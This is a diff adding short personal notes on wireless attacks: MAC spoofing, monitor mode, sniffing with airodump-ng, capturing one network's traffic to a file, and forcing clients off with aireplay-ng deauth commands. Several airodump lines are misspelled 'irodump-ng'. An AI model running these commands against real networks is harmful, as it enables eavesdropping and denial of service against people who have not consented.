@@ -1,0 +1,50 @@
+# changing mac add
+
+ifconfig wlan0 down
+ifconfig wlan0 hw ether 00:11:22:33:44:55
+ifconfig wlan0 up
+
+------------------------------------------------
+
+# changing to monitor mode
+
+ifconfig wlan0 down
+
+airmon-ng check kill
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+iwconfig
+
+------------------------------------------------
+
+# packet sniffing using airodump-ng
+
+# only 2.4
+irodump-ng wlan0
+
+# only 5
+irodump-ng --band a wlan0
+
+# both 2.4 & 5
+irodump-ng --band abg wlan0
+
+------------------------------------------------
+
+# targetting a specific network
+
+# only in the terminal
+airodump-ng --bssid 84:D8:1B:A8:E3:8E --channel 6 wlan0
+
+# written in a file as well
+airodump-ng --bssid 84:D8:1B:A8:E3:8E --channel 6 --write test wlan0
+
+------------------------------------------------
+
+# remove a device from a network (disconnecting for a certain time)
+
+# for 10 sec
+# -a == src mac ; -c == client mac
+aireplay-ng --deauth 10 -a 84:D8:1B:A8:E3:8E -c 7A:1D:4E:1D:02:1C wlan0
+
+# if on 5 GHz net
+aireplay-ng --deauth 10 -a 84:D8:1B:A8:E3:8E -c 7A:1D:4E:1D:02:1C -D wlan0
